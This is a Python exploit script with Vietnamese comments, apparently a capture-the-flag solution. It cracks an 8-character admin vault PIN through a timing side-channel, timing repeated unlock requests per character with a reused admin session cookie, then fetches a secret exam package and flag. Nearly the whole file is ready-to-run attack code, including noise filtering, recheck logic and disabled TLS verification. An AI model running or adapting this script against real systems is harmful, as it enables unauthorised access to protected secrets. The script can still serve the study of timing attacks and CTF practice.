import requests
import time
import urllib3
import sys

urllib3.disable_warnings()

# ============================================================
# CẤU HÌNH
# ============================================================
BASE_URL = ""
PIN_LENGTH = 8
PIN_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

REPEAT = 20          # số lần lặp mỗi candidate để lọc nhiễu mạng (min() cần đủ mẫu)
MIN_GAP_MS = 15      # khoảng cách tối thiểu giữa top1/top2 để tin là tín hiệu thật
RECHECK_REPEAT = 40  # số lần lặp khi cần đo lại để phân định

admin_session = requests.Session()
admin_session.verify = False
admin_session.cookies.update({
    "FCTF_Auth_Token": "",
    "fap_session": ""
})


def measure(pin, repeat=REPEAT):
    """Gửi request nhiều lần, trả về (min_ms, status, body_text)"""
    times = []
    status, body = None, None
    for _ in range(repeat):
        t0 = time.perf_counter()
        try:
            resp = admin_session.post(
                f"{BASE_URL}/api/v1/admin/vault/unlock",
                json={"pin": pin},
                timeout=15
            )
            status, body = resp.status_code, resp.text
        except requests.exceptions.RequestException as e:
            print(f"    !! Lỗi request: {e}")
            continue
        times.append(time.perf_counter() - t0)

    if not times:
        return None, status, body
    return min(times) * 1000, status, body


def check_auth_alive():
    """Kiểm tra token còn sống trước khi crack (tránh chạy mù rồi phát hiện lỗi giữa chừng)"""
    _, status, body = measure("A" * PIN_LENGTH, repeat=1)
    print(f"[*] Kiểm tra auth: status={status}, body={body}")
    if status == 401 and "token" in (body or "").lower() and "PIN" not in (body or ""):
        print("[-] Token hết hạn/không hợp lệ. Cập nhật cookie trong COOKIES rồi chạy lại.")
        sys.exit(1)


def crack_pin():
    cracked = ""
    for pos in range(PIN_LENGTH):
        pad_len = PIN_LENGTH - len(cracked) - 1
        print(f"\n=== Vị trí {pos + 1}/{PIN_LENGTH}, đã biết: '{cracked}' ===")

        results = {}
        for ch in PIN_ALPHABET:
            candidate = cracked + ch + ("0" * pad_len)
            t_ms, status, body = measure(candidate)
            if t_ms is None:
                print(f"    '{candidate}' -> LỖI, bỏ qua")
                continue
            results[ch] = t_ms
            print(f"    '{candidate}' -> {t_ms:.1f}ms")

        ranked = sorted(results.items(), key=lambda x: -x[1])
        best_ch, best_t = ranked[0]
        second_ch, second_t = ranked[1]
        gap = best_t - second_t
        print(f"  -> Top1: '{best_ch}' {best_t:.1f}ms | Top2: '{second_ch}' {second_t:.1f}ms | gap={gap:.1f}ms")

        if gap < MIN_GAP_MS:
            print(f"  !! Gap nhỏ ({gap:.1f}ms < {MIN_GAP_MS}ms) - đo lại top 3 ứng viên với repeat={RECHECK_REPEAT}")
            top3 = [c for c, _ in ranked[:3]]
            recheck = {}
            for ch in top3:
                candidate = cracked + ch + ("0" * pad_len)
                t_ms, _, _ = measure(candidate, repeat=RECHECK_REPEAT)
                recheck[ch] = t_ms
                print(f"     Đo lại '{candidate}' -> {t_ms:.1f}ms")
            best_ch = max(recheck, key=recheck.get)
            best_t = recheck[best_ch]

        cracked += best_ch
        print(f"-> CHỐT vị trí {pos + 1}: '{best_ch}' ({best_t:.1f}ms) | PIN hiện tại: '{cracked}'")

    return cracked


if __name__ == "__main__":
    print(">>> [GIAI ĐOẠN 3] Khai thác Timing Side-Channel để bẻ khóa Master Vault PIN...")
    print(f"[*] Chiều dài mã PIN: {PIN_LENGTH} ký tự | Bảng ký tự: {PIN_ALPHABET}")

    check_auth_alive()

    cracked_pin = crack_pin()
    print(f"\n[*] BẺ KHÓA DỰ ĐOÁN MÃ MASTER VAULT PIN: {cracked_pin}")

    # Xác nhận unlock thật
    unlock_res = admin_session.post(f"{BASE_URL}/api/v1/admin/vault/unlock", json={"pin": cracked_pin})
    print(f"[*] Status unlock: {unlock_res.status_code}")
    print(f"[*] Raw body: {unlock_res.text[:500]}")

    try:
        msg = unlock_res.json().get("message", unlock_res.text)
        print(f"[*] Kết quả mở khóa: {msg}")
    except requests.exceptions.JSONDecodeError:
        print("[-] Body không phải JSON hợp lệ (có thể bị rate-limit hoặc lỗi gateway).")

    if unlock_res.status_code == 200:
        flag_res = admin_session.get(f"{BASE_URL}/api/v1/admin/vault/secret-exam-package")
        print(f"[*] Status lấy flag: {flag_res.status_code}")
        if flag_res.status_code == 200:
            try:
                flag = flag_res.json().get("flag")
                print(f"[*] THÀNH CÔNG! FLAG: {flag}")
            except requests.exceptions.JSONDecodeError:
                print(f"[-] Không parse được JSON flag. Raw: {flag_res.text[:500]}")
        else:
            print("[-] Không lấy được Flag:", flag_res.text[:500])
    else:
        print("[-] Unlock thất bại, PIN dự đoán chưa đúng. Cần tăng REPEAT hoặc MIN_GAP_MS và chạy lại.")

    print("\n" + "=" * 60)
    print("  [+] HOÀN TẤT")
    print("=" * 60)
